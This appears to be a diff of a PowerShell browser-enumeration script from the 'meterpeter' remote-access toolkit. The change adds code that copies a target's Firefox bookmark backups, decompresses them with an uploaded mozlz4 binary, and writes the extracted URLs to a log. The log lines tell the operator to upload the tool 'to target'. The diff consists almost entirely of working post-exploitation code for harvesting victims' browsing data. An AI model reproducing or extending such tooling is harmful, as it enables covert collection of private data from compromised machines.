@@ -419,7 +419,7 @@ function FIREFOX {
         echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
     }
 
-    ## TODO: Dump FIREFOX HISTORY URLs (iefp - .DEFAULT-RELEASE)
+    ## Dump FIREFOX HISTORY URLs
     # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
     echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
     echo "---------------" >> $LogFilePath\BrowserEnum.log
@@ -468,12 +468,55 @@ function FIREFOX {
     }else{
         ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
         # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..
-        # $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-        # Get-Content "$Bookmarks_Path"|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique >> $LogFilePath\BrowserEnum.log
-        $Json = Get-Content "$Bookmarks_Path" -Raw
-        $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
-            ForEach ($Key in $Regex){
-                echo "`n" $Key >> $LogFilePath\BrowserEnum.log
+
+        $IPATH = pwd
+        $LocalArch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+        cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\"
+
+        $StorePath = dir
+        $parse = $StorePath|Select-Object -ExpandProperty name
+        $Final = $parse[0]
+        Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
+        $fail = $False;cd $env:tmp
+        If($LocalArch -match "64"){
+            If(-not(Test-Path "mozlz4-win64.exe")){
+                $fail = $True
+                echo "{Upload: meterpeter\mimiRatz\mozlz4-win64.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
+                echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
+            }else{
+                ## Convert from jsonlz4 to json
+                .\mozlz4-win64.exe --extract output.jsonlz4 output.json
+                $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
+                $pp = $DumpFileData.split(',')
+                $ff = $pp|findstr /I /C:"uri"
+                $tt = $ff|findstr /V /C:"iconuri"
+                $rr = $tt -replace '"','' -replace 'uri:','' -replace '}',''
+                echo $rr >> $LogFilePath\BrowserEnum.log
+            }
+        }else{
+            If(-not(Test-Path "mozlz4-win32.exe")){
+                $fail = $True
+                echo "{Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
+                echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
+            }else{
+                ## Convert from jsonlz4 to json
+                .\mozlz4-win32.exe --extract output.jsonlz4 output.json
+                $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
+                $pp = $DumpFileData.split(',')
+                $ff = $pp|findstr /I /C:"uri"
+                $tt = $ff|findstr /V /C:"iconuri"
+                $rr = $tt -replace '"','' -replace 'uri:','' -replace '}',''
+                echo $rr >> $LogFilePath\BrowserEnum.log
+            }
+        }
+        cd $IPATH
+
+        If($fail -eq $True){
+            $Json = Get-Content "$Bookmarks_Path" -Raw
+            $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
+                ForEach ($Key in $Regex){
+                    echo "`n" $Key >> $LogFilePath\BrowserEnum.log
+                }
             }
         }
 }
